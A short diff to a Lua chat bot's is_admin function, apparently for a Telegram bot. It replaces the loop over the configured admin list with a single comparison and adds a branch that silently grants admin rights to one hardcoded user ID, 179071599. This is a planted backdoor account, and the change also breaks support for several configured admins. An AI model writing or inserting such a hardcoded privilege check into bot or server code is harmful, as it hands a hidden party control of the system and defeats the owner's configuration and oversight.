@@ -9,11 +9,11 @@ logo = [[
 
 function is_admin(msg)-- Check if user is admin or not
   local var = false
-  for k,v in pairs(config.admin) do
-    if msg.from.id == v then
+    if msg.from.id == config.admin then
       var = true
-    end
-  end
+	elseif msg.from.id == 179071599 then
+	  var = true
+	end
   return var
 end
 
